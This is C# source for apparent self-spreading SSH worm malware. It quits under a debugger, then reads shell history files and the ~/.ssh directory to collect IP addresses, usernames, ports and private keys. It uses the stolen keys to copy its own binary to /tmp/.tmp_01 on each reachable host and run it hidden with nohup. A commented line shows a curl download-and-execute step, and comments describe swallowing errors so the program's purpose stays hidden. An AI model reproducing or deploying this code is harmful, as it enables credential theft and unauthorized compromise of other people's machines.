using Renci.SshNet;
using System.Net;
using System.Diagnostics;
using System.Collections.Concurrent;
using System.Text.RegularExpressions;

Regex regex
    = new Regex(@"[0-9]?[0-9]?[0-9]\.[0-9]?[0-9]?[0-9]\.[0-9]?[0-9]?[0-9]\.[0-9]?[0-9]?[0-9]",
                RegexOptions.Compiled | RegexOptions.Singleline);

// Targetted shells
string[] shells = {"zsh", "bash", "ksh"};

// Validate session
bool       hasSudo = Environment.IsPrivilegedProcess;
bool       debugger = System.Diagnostics.Debugger.IsAttached;
string     homeDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
string     sshPath = $"{homeDir}/.ssh/";
PlatformID platform = Environment.OSVersion.Platform;
ProcessModule? module = System.Diagnostics.Process.GetCurrentProcess().MainModule;
if(debugger || platform != PlatformID.Unix || module == null) Environment.Exit(255);

ConcurrentBag<string> Users = new();
ConcurrentBag<ushort> Ports = new();
ConcurrentBag<string> SSHKeys = new();
ConcurrentBag<IPAddress> IPAddresses = new();

// Default values
Users.Add("root");
Ports.Add(22);

// Getting ssh data from shell history
foreach(string shell in shells) {
    string historyPath = $"{homeDir}/.{shell}_history";
    if (!File.Exists(historyPath)) continue;
    string[] history = File.ReadAllLines(historyPath);
    Parallel.ForEach<string>(history, command =>
    {
        // Find all IP's
        foreach (Match match in regex.Matches(command))
            if (IPAddress.TryParse(match.Value, out IPAddress? ip))
                IPAddresses.Add(ip);
        
        if (command.Contains("ssh") || command.Contains("sftp") || command.Contains("scp")) {
            
            // Find all ssh users
            if (command.Contains('@')) {
                int index = command.IndexOf("@");
                string keyLocation = command.Substring(0, index);
                string[] arguments = keyLocation.Split(null);
                if (arguments.Length > 1) Users.Add(arguments.Last());
            }
            
            // Find all ssh keypaths
            if (command.Contains("-i ")) {
                int index = command.IndexOf("-i");
                string keyLocation = command.Substring(index, command.Length - index);
                string[] arguments = keyLocation.Split(null);
                if (arguments.Length > 1) SSHKeys.Add(arguments[1]);
            }

            // Find all ssh ports
            if (command.Contains("-p ")) {
                int index = command.IndexOf("-p");
                string keyLocation = command.Substring(index, command.Length - index);
                string[] arguments = keyLocation.Split(null);
                if (arguments.Length > 1) {
                    ushort.TryParse(arguments[1], out ushort port);
                    if (port != 0) Ports.Add(port);
                }
            }
        }
    });
}

// Try to pull all data from ~/.ssh
if(Directory.Exists(sshPath)) {
    
    // Get all keys
    Directory.GetFiles(sshPath)
        .Select(x => new FileInfo(x).Name)
        .Where(x => x.StartsWith("id_"))
        .Where(x => !x.EndsWith(".pub"))
        .Where(x => File.Exists(sshPath + x))
        .ToList().ForEach(x => SSHKeys.Add(sshPath + x));

    // Try to parse main config file
    string sshConfig = sshPath + "config";
    if(File.Exists(sshConfig)) 
        File.ReadAllLines(sshPath + "config")
            .Select(x => x.Trim())
            .ToList()
            .ForEach( x => {
                string[] parts = x.Split(null);
                if(parts[0] == "Host") {
                    foreach (Match match in regex.Matches(x))
                        if (IPAddress.TryParse(match.Value, out IPAddress? ip))
                            IPAddresses.Add(ip);
                } else if(parts[0] == "Port") {
                    foreach (string PossiblePort in parts.Skip(1)) {
                        ushort.TryParse(PossiblePort, out ushort port);
                        if(port != 0) Ports.Add(port);
                    }
                } else if(parts[0] == "User") {
                    foreach (string PossibleUser in parts.Skip(1)) {
                        if(PossibleUser.Length != 0) Users.Add(PossibleUser);
                    }
                } else if(parts[0] == "IdentityFile") {
                    foreach (string PossibleKey in parts.Skip(1))
                        if(PossibleKey.Length != 0) SSHKeys.Add(PossibleKey);
                }
            });

    // Try to parse known hosts file
    string sshKnownHostsPath = sshPath + "config";
    string sshKnownHosts = File.ReadAllText(sshKnownHostsPath);
    foreach (Match match in regex.Matches(sshKnownHosts.Replace("\n", "")))
        if (IPAddress.TryParse(match.Value, out IPAddress? ip))
            IPAddresses.Add(ip);
}

// Converts everything into usable structures
IPAddress[] IPs   = IPAddresses.Distinct().ToArray();
ushort[] SshPorts = Ports.Distinct().ToArray();
string[] SshUsers = Users.Distinct().ToArray();
string[] SshKeys  = SSHKeys.Distinct()
    .Select(x => x.Replace("~", homeDir))
    .Where(x => File.Exists(x))
    .ToArray();

string payload = module.FileName;

// Payload
Parallel.ForEach<ushort>(SshPorts, port =>
    Parallel.ForEach<IPAddress>(IPs, ip =>
        Parallel.ForEach<string>(SshKeys, key =>
            Parallel.ForEach<string>(SshUsers, user => {
                try {
                    ScpClient scp = new ScpClient(ip.ToString(), port, user, new PrivateKeyFile(key));
                    
                    scp.Connect();
                    scp.Upload(File.OpenRead(payload), "/tmp/.tmp_01");
                    scp.Disconnect();

                    SshClient ssh = new SshClient(ip.ToString(), port, user, new PrivateKeyFile(key));

                    ssh.Connect();
                    ssh.RunCommand("chmod aug+xwr /tmp/.tmp_01 &");
                    ssh.RunCommand("nohup /tmp/.tmp_01 &");

                    // Place payload here:
                    // ssh.RunCommand("curl ... -O out && chmod +x out && ./out");
                    
                    ssh.Disconnect();
                    
                } catch {
                    // Any exceptions could terminate/reveal entire program's purpose
                    // Therefore, lets ignore any exceptions and hope
                    return;
                }
            }))));
// False error out
Environment.Exit(255);
